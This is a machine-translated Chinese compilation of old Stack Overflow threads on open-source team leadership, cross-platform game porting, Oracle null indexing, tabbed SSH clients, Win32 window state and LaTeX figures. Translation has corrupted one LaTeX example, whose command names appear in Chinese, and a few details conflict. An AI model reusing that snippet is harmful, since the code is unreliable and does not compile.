如果您阅读大多数开源项目的历史，就会发现它们都是从一个人完成大量初始工作开始的。如果有一个团队，它很小，一个人实际上领导团队。

举一个例子。在 Python 社区中，他们将 Guido van Rossum 称为终生仁慈的独裁者 (BDFL)。他的话（或多或少）是最终的。在许多情况下，有些人不同意他的观点——但为了 Python 社区——他们似乎默认了他的判断。

我认为每个开源项目都有一个（单一的）首席程序员，他确保做出决定并以一致的方式做出决定。

回到过去，Fred Brooks（*The Mythical Man Month*）描述了“首席程序员团队”。相同的概念。有人负责技术内容。强调一个。如今，我们称其为“建筑师”或类似的术语。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-04-06T14:08:04.193

这里没有真正的方法论，但我认为有两件事很重要：

1.  有明确的目标和责任。
2.  让每个开发人员对他们分配的部分应该如何完成拥有最后的发言权。

在开源项目中，唯一真正和最强烈的动机是对产品进行编码的乐趣。关于上面的#2，如果人们被告知要做什么，但他们不同意，就会开始缺乏动力。当然，就像在任何其他类型的关系中一样，总会有一些让步。

另外关于面对面的时间，Skype 非常适合举行面对面的会议，我建议至少每周或每月一次（取决于项目的规模和势头）

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-04-06T14:00:03.760

我的猜测是您的私人项目都是由开发人员运行和编码的。众所周知，开发人员...继续开发。以我的经验，最大的区别在于，一家公司拥有经验丰富的经理，他们可以定义事情何时完成。我建议让某人负责定义目标并决定何时完成。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-04-06T14:15:05.237

我参加过一些项目，我们的谈话者比开发人员多得多。我的倾向是忽略谈话者并听取编码人员的意见。即使这样，通常也有一个人负责接受补丁。他们可能不得不轻描淡写地处理政治问题，但出于所有意图和目的，他们拥有最终决定权。

Linus 遇到了一些相当著名的问题。请注意 2006 年的这个帖子：[Talk is Cheap。给我看代码。](http://lkml.org/lkml/2000/8/25/132)

还有一件事。由于您在评论中说您确实有代码，只是进行了很多重写，因此我强烈建议您阅读 Eric Raymond 的[The Cathedral and the Bazzaar](http://www.catb.org/~esr/writings/cathedral-bazaar/cathedral-bazaar/)。Eric 实际上有点疯狂，但这篇文章对于任何想要运行自由软件项目的人来说都是无价之宝。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-04-06T14:22:57.667

这是一个很难回答的问题，因为“开源项目”是一个非常广泛的项目选择。我认为定义特征是项目有一个统一的目标（也许是一组相关的目标）。

你在任何开源邮件列表上吗？我订阅了我[最喜欢的发行版](http://archlinux.org)的邮件列表，并且开发人员每天都会互相发送多次电子邮件。此外，还有其他沟通渠道，例如 IRC / Instant Messenger。

我不是 RoR 开发人员，但我建议浏览[Getting Real](http://gettingreal.37signals.com/toc.php)以获得一些灵感。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-04-08T07:50:48.420

我会考虑一下你和你的队友在这个项目中的动机和目标。他们是否：

a）创造一个很棒的产品

或者

b) 玩弄软件，学习一些新东西

这两个答案同样有效，我猜这将是一个倾向于其中一个的混合体。

如果更多的是（a），那么请查看有关方法等的建议。甚至可以考虑围绕您的绝妙想法组建一家公司。因为制作这样的东西需要工作......而且你可能会在工作中得到足够的。

如果主要是（b），那么您将很难制作出出色的产品，但会更容易，因为您可以原谅自己没有立即到达那里并遭受多次重写。每次你看到它并一起工作时，你们都会学习新技能，这非常适用于你的长期职业生涯。

首先，我建议你们彼此清楚自己为什么在那里。然后考虑缩减你计划做的事情，尽早发布并经常发布。如果您的项目由三个组件组成并且一个是完整的，那么将其作为一个单独的组件发布并开始构建一个用户社区。这将得到回报，因为这些用户可能会帮助您编写代码，并为完整产品形成坚实的用户核心，并让您尽早而不是稍后评估您的进展情况。

祝你好运。

# c++ - 跨平台游戏开发要寻找什么？

> ID：721548
> 
> 赞同：2
> 
> 时间：2009-04-06T13:56:01.227
> 
> 标签：c++, linux, macos

我将在大约 3 周后开始游戏，我真的希望游戏至少能在另一个平台（linux、MacOS）上运行，但我的团队认为这是一项大量工作。我准备好了，但想知道我应该注意哪些不会移植到 linux 的东西（除了 Windows 特定的 API，如 DirectXsound）？

我一直在网上阅读，Windows "_s" 之类的功能`sprintf_s`似乎只存在于 Windows 上；这是正确的还是它们也在Linux上实现？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-04-06T14:18:27.430

不，标准 gcc 库中没有实现 _s 函数。（至少，grepping 'sprintf_s' 的包含文件根本没有结果。）

可能值得看看像[boost](http://www.boost.org/)和[apr](http://apr.apache.org/)这样的跨平台库来完成一些繁重的工作。

要寻找的特定事物的示例：

*   输入/输出（DirectX / SDL / OpenGL）
*   Win32/windows.h 功能（CreateThread 等）
*   在 UI 上使用 Windows 控件
*   同步原语（临界区、事件）
*   文件路径（目录分隔符、根名称）
*   宽字符实现（Windows 上 16 位，Linux 上 32 位）
*   Linux 上不支持 MFC（CString 等）

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-04-07T17:58:54.987

如果我是你，我会使用一些可用的框架来处理平台独立性。

我和一个朋友写了一个 3D 游戏作为一个爱好项目，服务器使用 Java，客户端运行在 Windows 和 Linux 上。我们最终使用 Ogre 作为 3D-Engine 和 OpenAL 作为 Sound-Engine，它们都独立于平台并且在 LGPL 下可用。

我真正需要单独编写的唯一内容是整个 Socket 处理、从文件系统读取配置和系统初始化。与该计划的其余部分相比，这几乎是微不足道的。

最耗时的是将整个项目设置为在 Windows 和 Linux（或 Mac）下编译，特别是如果您专注于其中一个并且只是偶尔检查另一个是否有问题。如果您的团队中有一个人在生产这些问题时定期检查这些问题，那么您也不会因此而产生太多开销。

总而言之，与游戏本身的编程相比，如果使用的所有框架都是编写良好的、独立于平台的系统，那么使其适应不同的平台几乎是不费吹灰之力的。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-04-06T14:10:05.187

尝试封装任何非标准扩展，如 DirectX、OpenGL、SDL 等。然后您只需根据平台重写这些部分。

在考虑移植之前，我也会让它在一个操作系统上播放。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-04-06T13:59:45.400

对于“安全”功能：它们是非标准的，几乎是安全的:)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-04-06T14:05:47.477

[Endianess](http://en.wikipedia.org/wiki/Endianess)是需要注意的。

Endianess 是字节中位的顺序。有些平台是大端，有些是小端。

这会影响您的程序的跨平台程度。但这将产生的最大影响将是网络通信。在发送或接收网络消息之前，您必须从一个字节序转换为另一个字节序。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-04-06T14:07:23.680

如果您专注于游戏玩法，设计一个*游戏*，然后他们实现移植应该不会特别繁重。如果您在多个平台上同时实现它，它应该是直截了当的。

但是，如果你专注于效果，设计一些你觉得会“把其他人从水中吹走”的东西，并试图将游戏创意粘贴到它们身上，那么你注定要失败。

所以这真的取决于你。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-04-06T14:13:23.137

对 windows-apis 不太了解，但我在您想要支持的所有平台上设置了一个每日（或提交时）全自动构建系统。如果你在你的 windows-box 上开发的东西在其他机器上不起作用，你的构建系统应该通知你“在平台 x 上构建失败，有关详细信息，请参阅日志文件/附件/whatnot”。它将捕获很多跨平台问题。单元测试也会有所帮助。

是否从一开始就针对多个平台是一个好主意是另一个问题。

就我个人而言，我会开始在另一个平台上进行开发，然后再考虑将其移植到 Windows ;-)

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-04-07T18:23:48.440

请记住，您正在创建一个不依赖于任何操作系统细节的游戏模型。您的游戏依赖于不依赖于操作系统的状态管理和算法。关键是编写你的游戏逻辑而不依赖于特定的库，这意味着大量的封装。

你不应该直接调用sprintf_s你应该写一个可以根据平台改变的例程，类或MACRO，当你可以使用可以针对不同平台定制的类或typedef时不要使用DWORD。

例如，如果你在做一场足球比赛，那么投球、跑动、抢断、球员位置的算法可以完全在标准 C++ 中完成，而无需依赖平台。如果您的封装很好，您可以将游戏状态转储到文件中，并使用渲染程序单独显示。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2009-04-11T10:45:24.097

如果您真的想轻松进行跨平台开发，我建议您使用已构建的跨平台引擎之一，如 Unity 或 Garage Games 的东西之一，如 Torque Game Builder (2D)。

我的经验几乎为零，因此无法告诉您哪个更好，但是 Torque Game builder 演示无法顺利完成第一个教程，而且他们没有像他们声称的那样在论坛中回答技术支持问题因此，如果您像我一样是游戏设计新手，我可以说避免使用它们。Garage Games 最重要的事情应该是他们的大力支持，我看到零支持，实际上只看到一堆，“嘿，有人在这里吗？” 没有答案的帖子，所以我猜他们几乎放弃了支持他们的产品。

[http://unity3d.com/](http://unity3d.com/)

[http://www.garagegames.com/](http://www.garagegames.com/)

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2009-04-11T11:01:31.033

我很惊讶没有人提到 libSDL 和 OpenGL，因为大多数跨平台游戏都是使用这些库编写的。

如果你的游戏是 2D 的，你可以使用[libSDL](http://www.libsdl.org)。使用它编写的游戏的一个很好的例子是[韦诺之战](http://www.wesnoth.org)。SDL 在 Windows 上使用 DirectX，它只是它的一个瘦包装器。

如果您的游戏是 3D，请使用[OpenGL](http://www.opengl.org/)。例如，Quake 3 使用该库。你可以找到大量的例子和文档。当然，还有很多封装了 OpenGL 的库，所以你不必做低级的东西。研究 OGRE、Crystal Space 等。

至于基本的 C/C++ 库和函数兼容性，最好安装一些 Linux 并简单地运行该函数的手册页以查看它是否存在。[你可以在网上](http://www.linuxmanpages.com/man3)查一下。

# php - PHP：从 html 表创建图像

> ID：721549
> 
> 赞同：0
> 
> 时间：2009-04-06T13:56:01.867
> 
> 标签：php, html, image

我可以在 PHP 中获取一些用于将 html 表格转换为图像形式（.gif、.jpg 或任何格式）的示例代码吗？我在 Windows 上使用 XAMPP。
是的，该表来自数据库。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-04-06T16:36:55.803

最好的方法是先转换为 .ps，然后转换为 jpg、pdf 或您需要的其他格式。我可以建议你 2 个链接： [html2ps](http://www.tufat.com/s_html2ps_html2pdf.htm "html2ps")

[wkhtmltopdf](http://code.google.com/p/wkhtmltopdf/ "wkhtmltopdf")

两者都进行了测试，两者都完美运行... html2ps 有点慢（3 页 pdf 约 30 秒，不知道 jpg）但更可定制。给他们看看

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-04-06T14:01:49.310

你喜欢从 html-table / html-code 截取屏幕截图吗？仅使用 php 是不可能的。您需要一个网络浏览器或一个 html 渲染器，并且一个程序会制作屏幕截图。

看看 [http://www.thumbshots.org/](http://www.thumbshots.org/)（在线服务）

或 [http://www.intellitamper.com/webswoon/（python](http://www.intellitamper.com/webswoon/)工具。）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-04-06T14:04:58.023

乍一看，这是一项艰巨的任务。这里有一些提示：

*   您可能想要熟悉 GD 库

这个表是哪里来的？如果它最初来自您的数据库，那么使用起来会更容易。否则...

*   您需要获取远程页面（我推荐 curl）
*   然后你需要提取表格数据

第二步的复杂性实际上取决于每个页面和表格的相似程度。正则表达式可能会很有用。

希望这可以帮助，

汤姆

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-19T00:00:05.283

正如 DrFuture 提到的，仅使用 php 可能不是将表格转换为图像的最佳方式。我修改了[http://www.zubrag.com/scripts/website-thumbnail-generator.php](http://www.zubrag.com/scripts/website-thumbnail-generator.php)以使其将我的 html 转换为图像（将 html 放在另一个网页上并将该 url 传递给脚本）。我建议使用“截图”路线而不是 GDI 和其他绘图工具。

# ssh - 用于 Windows 的选项卡式 SSH 工具？

> ID：721552
> 
> 赞同：18
> 
> 时间：2009-04-06T13:57:02.300
> 
> 标签：ssh

我家里有一台 macintosh，我可以通过 macintosh 工具进行 ssh，然后打开多个连接的选项卡。我使用了 putty 和 SSH Secure Shell 的免费版本。是否有任何适用于 Windows 的免费 SSH 工具允许我使用选项卡而不是新窗口打开新连接？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2009-04-06T14:00:28.313

Putty Connection Manager ( [http://www.windowstipspage.com/download-putty-and-connection-manager/](http://www.windowstipspage.com/download-putty-and-connection-manager/) ) 基于 Putty。

> PuTTY Connection Manager 是适用于 Windows 平台的免费 PuTTY 客户端插件，其目标是提供管理多个 PuTTY 实例的解决方案。

特征：

> *   PuTTY 实例的选项卡和可停靠窗口。
> *   完全**兼容 PuTTY**配置（使用注册表）。
> *   轻松定制以优化工作空间（全屏、最小化到托盘、添加/删除工具栏等）。
> *   不受协议限制（用户键盘模拟）的自动登录功能。
> *   登录后命令（登录后执行任何 shell 命令）。
> *   连接管理器：管理大量具有特定配置的连接（自动登录、特定的 PuTTY 会话、后期命令等）。
> *   快速连接工具栏可快速启动 PuTTY 连接。
> *   将整个连接信息导入/导出为 XML 格式（从另一个工具自动生成您的配置并将其导入，或导出您的配置以进行备份）。
> *   加密配置数据库选项可用于安全存储连接信息（支持 AES 算法的外部库，密钥大小为 128、192 和 256 位，请参阅您所在国家/地区的加密软件的法律状态）。
> *   **独立可执行文件，无需设置**。

完全免费用于商业和个人用途：PuTTY Connection Manager 是免费软件。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2010-11-27T18:21:17.110

超级腻子。SuperPutty 是一个从 google 代码开始但看起来被废弃的项目。我已经在 github.com/phendryx/superputty 分叉了这个项目，下载/讨论可以在[http://superputty.vanillaforums.com](http://superputty.vanillaforums.com)找到。

我鼓励任何开发人员在 github 上 fork 我的 repo。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-09-11T16:27:20.447

一个旧线程，但我发现了一些非常好的东西，所以如果有像我这样的人还在寻找：

1.  使用[KiTTY](http://www.9bis.net/kitty/?page=Download)（PuTTY 的一个分叉/更好的版本）
2.  使用[mRemoteNG](http://www.mremoteng.org/download)作为“选项卡式连接管理器”。
    *   在 Tools->Options->Advanced 下的“Use custom path for PuTTY”中设置 KiTTY.exe 的路径。

如果您不想要 KiTTY，只需在此处设置 PuTTY 路径即可。但我强烈建议您在决定之前先看看 KiTTY，因为它具有相同的外观和感觉，并且它会复制您的 PuTTY 设置，因此您不必花一天时间移植所有旧的 PuTTY 连接。

[资源](http://www.ericvb.com/archives/the-best-tabbed-ssh-solution-in-windows-7)

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2012-09-06T13:10:34.653

[ConEmu](http://code.google.com/p/conemu-maximus5/)也可以正常工作。它通常与远程管理器一起使用，但可以与任何其他控制台/gui 应用程序一起使用。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2009-04-06T13:59:34.463

[Poderosa](http://poderosa.sourceforge.net/)几乎是带有标签的腻子。

**特征：**

> 选项卡式 GUI 同时打开多个连接很方便。此外，您可以将窗口拆分为窗格并分配每个连接。许多不同的连接方式。除了 Telnet 和 SSH1/2，还支持本地 cygwin shell 和串行端口。
> 
> 实现选项和工具 许多终端功能可用。示例包括：SSH2 端口转发、SSH 密钥生成向导和 SOCKS 连接。
> 
> 插件架构 您可以通过插件来扩展 Poderosa 的功能，就像 Eclipse 一样。通过串行端口的连接和 X/ZModem 支持作为附加插件提供。插件开发者手册包含在安装包中。
> 
> 政府支持 2005 年，日本政府选择了我们的创新软件项目并提供财政资源支持。

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2014-05-24T02:38:43.773

腻子

[http://sourceforge.net/projects/putty-nd/](http://sourceforge.net/projects/putty-nd/)

描述

PuTTY 套件的 Noodle 构建，具有 chrome 样式的选项卡式 UI 以及可分组和可搜索的会话管理。仅适用于 Windows。

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2012-02-02T14:40:56.167

我自己一直在寻找一个，我发现 MobaXterm 非常好。它仍在开发中，他们在每个版本中都做得更好。它曾经在使用选项卡时反应迟缓，并且有一个烦人的窗口闪烁，这在最新版本中得到了解决。我已经尝试过 Poderosa 和 PuttyCM，但 Poderosa 尚未积极开发。PutttyCM 让我的 alt+tab 失控。

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2013-05-06T19:06:22.663

我使用了 PuttyCM，但它在 Windows 7 上失败了。取而代之的是，我开始爱上[MTPuTTY](http://ttyplus.com/multi-tabbed-putty/)。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2011-06-01T19:45:33.700

用于在单个选项卡式窗口中管理多个 PuTTY 实例的 Windows 工具。

[http://sites.google.com/site/macdsite/utilidades/puttytabmanager](http://sites.google.com/site/macdsite/utilidades/puttytabmanager)

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2012-07-24T13:50:42.107

这是一个相当古老的问题。但是我想在这里留下一个很好的链接，其中概述了该问题的一些解决方案。

[http://www.ericvb.com/archives/the-best-tabbed-ssh-solution-in-windows-7](http://www.ericvb.com/archives/the-best-tabbed-ssh-solution-in-windows-7)

建议的方法是使用 Kitty 和 mRemoteNG。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2009-05-04T18:13:32.940

您可以将[Console](http://sourceforge.net/projects/console/)与任何命令行 SSH 客户端结合使用。我使用[Cygwin](http://www.cygwin.com/)附带的那个。

# oracle - Oracle 10g - 优化 WHERE IS NOT NULL

> ID：721556
> 
> 赞同：18
> 
> 时间：2009-04-06T13:58:17.757
> 
> 标签：oracle, optimization, null

我们有 Oracle 10g，我们需要查询 1 个表（无连接）并过滤掉其中 1 列为空的行。当我们这样做时——WHERE OurColumn IS NOT NULL——我们对一个非常大的表进行全表扫描——坏坏坏。该列上有一个索引，但在这种情况下它会被忽略。有什么解决办法吗？

谢谢

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2009-04-06T14:04:20.723

优化器认为全表扫描会更好。

如果只有几`NULL`行，则优化器是正确的。

如果您绝对确定索引访问会更快（也就是说，您有多个`75%`带有 的行`col1 IS NULL`），那么提示您的查询：

```
SELECT  /*+ INDEX (t index_name_on_col1) */
        *
FROM    mytable t
WHERE   col1 IS NOT NULL 
```

为什么`75%`？

因为使用`INDEX SCAN`来检索索引未覆盖的值意味着隐藏连接`ROWID`，其成本大约`4`是表扫描的几倍。

如果索引范围包括多于`25%`行，则表扫描通常更快。

如前所述`Tony Andrews`，聚类因子是衡量这个值的更准确的方法，但`25%`仍然是一个很好的经验法则。

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2009-04-06T16:46:53.627

优化器将根据全表扫描的相对成本和使用索引来做出决定。这主要归结为必须读取多少块才能满足查询。另一个答案中提到的 25%/75% 的经验法则很简单：在某些情况下，即使获得 1% 的行，全表扫描也是有意义的——即，如果这些行恰好分布在许多块中。

例如，考虑这个表：

```
SQL> create table t1 as select object_id, object_name from all_objects;

Table created.
SQL> alter table t1 modify object_id null;

Table altered.

SQL> update t1 set object_id = null
  2  where mod(object_id,100) != 0
  3  /

84558 rows updated.

SQL> analyze table t1 compute statistics;

Table analyzed.

SQL> select count(*) from t1 where object_id is not null;

  COUNT(*)
----------
       861 
```

如您所见，T1 中只有大约 1% 的行具有非空 object_id。但由于我建表的方式，这 861 行将或多或少均匀地分布在桌子周围。因此，查询：

```
select * from t1 where object_id is not null; 
```

即使优化器使用了索引，也可能会访问 T1 中的几乎每个块来获取数据。那么放弃索引并进行全表扫描是有意义的！

帮助识别这种情况的一个关键统计数据是索引聚集因子：

```
SQL> select clustering_factor from user_indexes where index_name='T1_IDX';

CLUSTERING_FACTOR
-----------------
              460 
```

这个值 460 相当高（与索引中的 861 行相比），表明将使用全表扫描。请参阅[有关聚类因素的 DBAZine 文章](http://web.archive.org/web/20090604211355/http://www.dbazine.com/oracle/or-articles/hotka2)。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-04-06T14:00:28.313

如果您正在执行选择 *，那么执行表扫描而不是使用索引是有意义的。如果您知道您对哪些列感兴趣，您可以使用这些列加上您应用 IS NOT NULL 条件的列创建一个覆盖索引。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-04-22T13:21:02.677

它可能取决于您在表上拥有的索引类型。

大多数 B 树索引**不**存储空条目。位图索引**确实**存储空条目。

所以，如果你有：

> select * from mytable where mycolumn 为空

并且您有一个标准的 B-tree 索引`mycolumn`，则查询**不能**使用索引，因为“null”不在索引中。

（如果索引针对多个列，并且索引列之一不为空，则索引中将有一个条目。）

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-04-06T14:08:27.967

在该列上创建索引。

为了确保索引被使用，它应该在索引和其他列中的where。

ocdecio 回答：

> 如果您正在执行选择 *，那么执行表扫描而不是使用索引是有意义的。

严格来说，这不是真的。如果存在适合您的 where 子句的索引，则将使用索引，并且查询优化器决定使用该索引比执行表扫描更快。如果没有索引，或者没有合适的索引，那么就必须进行表扫描。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-04-23T03:05:30.510

还值得检查一下 Oracle 对表的统计信息是否是最新的。它可能不知道全表扫描会更慢。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2015-01-30T15:40:27.377

Oracle 数据库根本不会在常规（b-tree）索引中索引空值，因此它不能使用它，也不能强制 oracle 数据库使用它。

BR

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2016-05-02T20:12:18.113

使用提示只能作为一种解决方法而不是一种解决方案。

如其他答案中所述，空值在 B-TREE 索引中不可用。

既然您知道此列中大部分为空值，那么您是否可以将空值替换为例如范围。

这实际上取决于您的列和数据的性质，但通常，如果您的列是日期类型，例如：

`where mydatecolumn is not null` 可以翻译成一条规则：我想要所有有日期的行。

那么你绝对可以这样做： where mydatecolumn <=sysdate (in oracle)

这将返回所有带有日期的行并省略空值，同时利用该列上的索引而不使用任何提示。

* * *

## 回答 #9

> 赞同：-1
> 
> 时间：2010-02-24T12:45:48.257

见[http://www.oracloid.com/2006/05/using-index-for-is-null/](http://www.oracloid.com/2006/05/using-index-for-is-null/)

如果您的索引位于单个字段上，则不会使用它。尝试在索引中添加一个虚拟字段或常量：

```
create index tind on t(field_to_index, 1); 
```

# asp.net - System.Web.dll 引用 System.Windows.Forms？

> ID：721558
> 
> 赞同：0
> 
> 时间：2009-04-06T13:58:35.933
> 
> 标签：asp.net, winforms

我从朋友那里听说 asp.net 依赖/使用 Windows 窗体类。我试图弄清楚可能是哪一门课。

我发现的唯一类是`System.Web.UI.WebControls.FontInfo`
具有属性`public string[] Names`
的属性`Editor("System.Windows.Forms.Design.StringArrayEditor--snip")`

System.Web.dll 中是否有对 Windows.Forms.dll 的引用？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-11-25T03:45:52.343

我认为 System.Web，版本 2.0.0.0 有对 System.Windows.Forms 的引用。

查看 Reflector 中的 System.Web.Compilation.ResXBuildProvider.GetResourceReader(Stream)。
上线一：**ResXResourceReader reader = new ResXResourceReader(inputStream);** ResXResourceReader 来自 System.Windows.Forms，版本 2.0.0.0

我很好奇，因为我在 Visual Studio 的加载模块窗口中注意到 System.Windows.Forms。

ildasm System.web.dll /out =System.Web.il 让我快速搜索 System.Windows.Forms 引用。我无法很快找到一种从反射器中做到这一点的方法。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-04-06T14:01:16.317

没有参考，也没有 System.Windows.Forms。

StringArrayEditor 是 System.Design 程序集中的 UITypeEditor。除非在设计时使用，否则它不会被加载，此时它将被“延迟加载”。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-04-06T14:01:34.333

首先，我不确定这样的存在。

但命名空间或类名并不一定意味着您需要对 Windows.Forms.dll 的引用。您可以在 Windows.Forms.dll 之外的程序集中定义“System.Windows.Forms.Design.StringArrayEditor”。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-04-15T15:00:59.580

如果您查看方便的[Reflector](http://www.red-gate.com/products/reflector/)工具中的 System.Web 程序集，您会发现确实存在从 System.Web 到 System.Windows.Forms 的引用。但是，如果您使用 Reflector 的插件之一，它将反向工程代码导出到文件（例如[FileGenerator](http://www.codeplex.com/FileGenReflector)），然后通过它进行搜索，则没有实际使用 System.Windows.Forms。由于 .Net 运行时只会在实际需要时加载程序集，因此 WinForms 程序集绝不应该通过使用 System.Web 来实际加载。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2009-04-06T14:17:53.950

将我添加到怀疑者名单中。但更重要的是，这并不重要。.Net 框架设置为链接添加或删除对框架附带的任何核心程序集的依赖的方式不会以任何有意义的方式真正影响性能。

# c# - 通过 C# 在电子邮件中添加 vcal

> ID：721565
> 
> 赞同：1
> 
> 时间：2009-04-06T13:59:46.943
> 
> 标签：c#, vcal

我需要在通过 C# 发送给某人的电子邮件中添加 VCal 选项。我已经在我的 Web 应用程序中实现了 VCal 功能。

我的电子邮件正文也是 HTML 类型。我也想在我的电子邮件内容中添加相同的 VCal 选项。

有什么方法可以实现相同的效果，而不是将 .ics 文件添加为附件？
我想通过电子邮件以编程方式添加 Outlook 提醒（.ics 文件）。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-04-06T14:24:54.170

以 129 美元的价格查看[aspnetEmail](http://aspnetemail.com/)，它可能比自己编写要便宜得多。他们对支持问题也相当敏感。

该工具将为您提供所需的所有功能以及一些功能。

# iphone - 模态视图未从堆栈中删除

> ID：721568
> 
> 赞同：1
> 
> 时间：2009-04-06T14:00:17.783
> 
> 标签：iphone, objective-c

我正在创建一个使用以下代码打开的模式视图

```
[[self navigationController] presentModalViewController:registrationController animated:NO]; 
```

直到最近，下面的代码被用来在按下按钮时隐藏它

```
[self dismissModalViewControllerAnimated:YES]; 
```

但是由于某种原因，该行不再删除视图并且没有出现错误。

我也试过

```
[self.view removeFromSuperView]; 
```

但这只会给我留下一个全白的屏幕

任何关于我如何调试这个问题的建议都会很棒，因为我很难过

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-04-06T14:47:40.260

假设您的控制器是 的子类`UIViewController`，则在模态视图控制器中：

```
[self.parentViewController dismissModalViewControllerAnimated:YES]; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-04-06T15:51:01.700

我解决了加载模式后更新导航控制器以更改样式的问题，更改顺序解决了问题

# windows - 确定当前是否正在移动给定窗口

> ID：721569
> 
> 赞同：1
> 
> 时间：2009-04-06T14:00:21.280
> 
> 标签：windows, winapi, window-messages

基本上，我正在寻找 IsWindowMoving(HWND) Win32 API 调用。我需要知道用户当前是否正在移动窗口。

该窗口不属于我，因此无法监听 WM_SYSCOMMAND / SC_MOVE 或 WM_MOVING（由于 32/64 互操作，我不想子类化或挂钩）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-04-06T14:21:30.323

如果该窗口不属于您并且您不打算窥探消息，那么我认为最好的办法就是掌握该窗口的句柄。这将您限制为存在于句柄上的任何信息函数调用。我知道没有这样的调用可以通知用户窗口正在移动。

你可能不走运。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-04-20T17:55:25.467

您可以使用[GetGUIThreadInfo](http://msdn.microsoft.com/en-us/library/ms633506(VS.85).aspx)执行此操作- 无需挂钩。使用 GetWindowThreadProcessId 获取您的 hwnd 的 TID，然后检查 GUITHREADINFO.flags 和 GUITHREADINFO.hwndMoveSize 以查看您的窗口是否处于移动/大小循环中。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-04-20T18:01:57.527

如果您不想挂钩、子类或其他类似的东西，我认为轮询可能是最简单的方法。使用[`GetWindowRect`](http://msdn.microsoft.com/en-us/library/ms633519(VS.85).aspx)您可以跟踪窗口的先前和当前位置和大小。执行增量可以让您检测用户是否正在移动（甚至调整大小）窗口。由于您正在处理 UI，因此无需太快进行轮询（即使每秒 2-5 次也足够了）。

# latex - 在 LaTeX 中插入图像

> ID：721572
> 
> 赞同：4
> 
> 时间：2009-04-06T14:01:03.307
> 
> 标签：latex, pdflatex

我有一个关于将图像插入 LaTeX 文档的问题。我尝试使用键盘快捷键插入图像：`Ctrl`- `Alt`-`G`我可以插入图像。但是编译后的 pdf 文档最后显示了所有图像，而我想将图像与文本交错。类似于以下内容：

```
Text1
Image1
Text2
Image2
Text3
Image3 
```

我尝试在正确的位置插入图像，即在文本之间，但在编译时，它们都出现在最后。我尝试了图像插入 UI 上提供的不同选项，但结果相同。

知道我哪里出错了。

相关的[SO 问题](https://stackoverflow.com/questions/518284/problem-with-float-and-pictures-in-latex/518418#518418)。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2009-04-06T14:45:14.120

您必须使用[graphicsx 包](https://ctan.org/pkg/graphicx)：

```
\usepackage{graphicx} 
```

然后你只需使用 \includegraphics

```
\includegraphics{myfig.pdf}
\includegraphics[width=60mm]{myfig.png}
\includegraphics[height=60mm]{myfig.jpg}
\includegraphics[scale=0.75]{myfig.pdf}
\includegraphics[angle=45,width=52mm]{myfig.jpg} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-04-06T14:04:51.847

尝试缩小图像。也许它们太大了，所以它们被移到了文档的末尾。

希望能帮助到你。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-04-06T14:06:40.670

您在 \figure 环境中使用了什么代码？在大多数情况下，“h”选项至少应该有一点帮助。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2009-04-06T23:27:02.510

这是一个常见问题解答：“[在 LaTeX 中移动表格和图形](http://www.tex.ac.uk/cgi-bin/texfaq2html?label=floats)”。特别注意第三个点，它放宽了 LaTeX 用于定位浮点数的一些限制。

这是我可以给出的最佳答案，而无需查看浮点数有多大以及如何将它们插入文档的示例。只要它们尺寸合理，您应该没有问题

```
\begin{图}[htbp]
  \includegraphics{myfig}
  \标题{...}
  \标签{无花果：我的无花果}
\结束{图}

```

请注意，如果浮动太大而无法容纳，那么它将*移动*到后续页面 - 这是让 LaTeX 帮助您进行格式化的整个想法。您当然不希望仅仅因为接下来出现一个不合适的数字而过早结束页面。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-06-05T09:30:01.190

